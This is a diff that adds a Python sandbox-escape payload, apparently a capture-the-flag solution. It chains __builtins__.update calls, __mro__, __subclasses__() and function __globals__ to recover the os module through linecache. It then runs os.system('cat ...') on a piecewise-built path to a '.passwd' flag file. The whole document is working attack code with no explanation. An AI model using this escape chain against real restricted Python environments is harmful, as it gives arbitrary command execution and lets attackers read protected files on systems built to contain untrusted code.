@@ -1,0 +1,37 @@
+__builtins__.update({'a':{}})
+a.update({'a':__builtins__})
+a.update({'b':result.__class__})
+__builtins__.update({'b':a['b']})
+a.update({'b':b.__mro__[1]})
+__builtins__.update({'c':a['b']})
+a.update({'c':c.__subclasses__()})
+__builtins__.update({'c':a['c']})
+
+a.update({'e':c[-20].__init__})
+__builtins__.update({'e':a['e']})
+e.__global__.keys()
+a.update({'e':e.__globals__})
+__builtins__.update({'e':a['e']})
+
+a.update({'f':e['linecache']})
+__builtins__.update({'f':a['f']})
+a.update({'f':f.__dict__['os']})
+__builtins__.update({'f':a['f']})
+
+a.update({'h':c[-3].__init__})
+__builtins__.update({'h':a['h']})
+a.update({'h':h.__globals__})
+__builtins__.update({'h':a['h']})
+h['os'] = f
+
+a.update({'x':'GetTheFlag'})
+__builtins__.update({'x':a['x']})
+a.update({'x':x+'InThis'})
+__builtins__.update({'x':a['x']})
+a.update({'x':x+'Directory'})
+__builtins__.update({'x':a['x']})
+a.update({'x':x+'/.passwd'})
+__builtins__.update({'x':a['x']})
+
+h['os'].system("cat "+x)
+
